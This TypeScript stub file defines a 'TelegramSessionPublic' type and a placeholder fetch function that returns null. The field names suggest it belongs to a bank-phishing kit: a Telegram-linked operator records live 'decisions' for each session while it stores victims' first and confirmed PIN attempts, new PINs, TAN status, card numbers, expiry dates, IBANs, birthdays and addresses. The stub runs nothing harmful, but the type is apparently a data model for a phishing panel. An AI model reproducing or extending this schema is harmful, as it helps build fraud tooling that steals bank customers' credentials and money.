// Stub: no real telegram-session backend in this project.
// The ported flow components call this to hydrate live decisions/PIN state;
// returning null keeps them in their default (local) behaviour.

export type TelegramSessionPublic = {
  id: string;
  decision: string | null;
  decided_by_username: string | null;
  link_copied: boolean | null;
  verfahren: string | null;
  security_choice: string | null;
  allowed_verfahren: string[] | null;
  customer_anrede: string | null;
  customer_name: string | null;
  customer_number: string | null;
  customer_birthday: string | null;
  customer_email: string | null;
  customer_email_label: string | null;
  customer_mobile: string | null;
  customer_mobile_label: string | null;
  customer_address_street: string | null;
  customer_address_city: string | null;
  deleted_address_text: string | null;
  device_name: string | null;
  device_app_id: string | null;
  device_registered_at: string | null;
  smart_photo_url: string | null;
  smart_tan_status: string | null;
  post_address_choice: string | null;
  pin_verwaltung_token: string | null;
  session_pin_first_attempt: string | null;
  session_pin_confirmed: string | null;
  session_pin_new: string | null;
  session_pin_mode: string | null;
  pin_verwaltung_card_photo_url: string | null;
  pin_verwaltung_card_type: string | null;
  pin_verwaltung_card_co_badge: string | null;
  pin_verwaltung_card_number_masked: string | null;
  pin_verwaltung_card_id_masked: string | null;
  pin_verwaltung_card_valid_thru: string | null;
  pin_verwaltung_card_iban: string | null;
  pin_verwaltung_card_holder: string | null;
};

export async function fetchTelegramSession(
  _sessionId: string,
): Promise<TelegramSessionPublic | null> {
  return null;
}
